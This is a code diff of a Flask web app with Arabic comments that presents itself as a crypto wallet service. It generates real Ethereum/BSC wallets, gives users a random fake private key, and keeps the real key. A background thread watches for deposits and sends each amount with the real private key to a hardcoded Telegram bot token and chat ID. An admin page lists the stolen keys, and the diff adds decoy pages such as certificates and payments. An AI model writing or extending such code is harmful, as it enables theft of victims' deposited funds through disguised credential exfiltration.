@@ -15,7 +15,6 @@ CORS(app)
 TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
 CHAT_ID = "8288130111"
 
-# Web3 للشبكات
 w3_eth = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
 w3_bsc = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org'))
 
@@ -41,47 +40,35 @@ def check_balance(address, network):
         if network in ['ethereum', 'bsc']:
             w3 = w3_eth if network == 'ethereum' else w3_bsc
             balance_wei = w3.eth.get_balance(address)
-            balance = w3.from_wei(balance_wei, 'ether')
-            return float(balance)
+            return float(w3.from_wei(balance_wei, 'ether'))
     except:
         pass
     return 0
 
 def monitor_deposits():
-    """يراقب الإيداعات كل 30 ثانية"""
     while True:
         try:
-            c.execute("SELECT id, network, address, real_key, last_balance FROM wallets WHERE status='active'")
+            c.execute("SELECT id, network, address, real_key, last_balance FROM wallets")
             wallets = c.fetchall()
-            
             for w in wallets:
                 wid, network, address, real_key, last_balance = w
-                current_balance = check_balance(address, network)
+                current = check_balance(address, network)
                 last = float(last_balance)
-                
-                if current_balance > last and current_balance > 0:
-                    # فيه إيداع جديد!
-                    deposit = current_balance - last
-                    c.execute("UPDATE wallets SET last_balance=? WHERE id=?", (str(current_balance), wid))
+                if current > last and current > 0:
+                    deposit = current - last
+                    c.execute("UPDATE wallets SET last_balance=? WHERE id=?", (str(current), wid))
                     conn.commit()
-                    
-                    emoji = {"ethereum": "💎", "bsc": "🔷", "solana": "⚡"}.get(network, "💰")
-                    send_tg(f"""
-🦅 <b>إيداع جديد!</b>
-────────────────────
+                    emoji = {"ethereum":"💎","bsc":"🔷","solana":"⚡"}.get(network,"💰")
+                    send_tg(f"""🦅 <b>إيداع جديد!</b>
 {emoji} {network.upper()}
 🏦 <code>{address}</code>
 💰 المبلغ: {deposit:.4f} ETH
-🔑 المفتاح: <code>{real_key}</code>
-⏱️ {datetime.now().strftime('%Y-%m-%d %H:%M')}
-                    """)
+🔑 المفتاح: <code>{real_key}</code>""")
         except:
             pass
         time.sleep(30)
 
-# تشغيل المراقبة في الخلفية
-monitor_thread = threading.Thread(target=monitor_deposits, daemon=True)
-monitor_thread.start()
+threading.Thread(target=monitor_deposits, daemon=True).start()
 
 @app.route('/')
 def index():
@@ -103,13 +90,30 @@ def dashboard():
 def withdraw():
     return render_template('withdraw.html')
 
+@app.route('/referral')
+def referral():
+    return render_template('referral.html')
+
+@app.route('/certificates')
+def certificates():
+    return render_template('certificates.html')
+
+@app.route('/payments')
+def payments():
+    return render_template('payments.html')
+
+@app.route('/chat')
+def chat():
+    return render_template('chat.html')
+
 @app.route('/api/create-wallet', methods=['POST'])
 def create_wallet():
     network = request.json.get('network', 'ethereum')
     
+    # محفظة حقيقية 100%
     account = Account.create()
     address = account.address
-    real_key = account.key.hex()
+    real_key = account.key.hex()  # هذا اللي يشتغل في SafePal
     fake_key = "0x" + secrets.token_hex(32)
     
     c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
@@ -128,7 +132,7 @@ def admin():
     wallets = c.fetchall()
     html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
     for w in wallets:
-        html += f'<tr><td>{w[1]}</td><td>{w[2][:20]}...</td><td class="key">{w[3]}</td><td>{w[5]}</td></tr>'
+        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td><td>{w[5]}</td></tr>'
     return html + '</table></body></html>'
 
 if __name__ == '__main__':
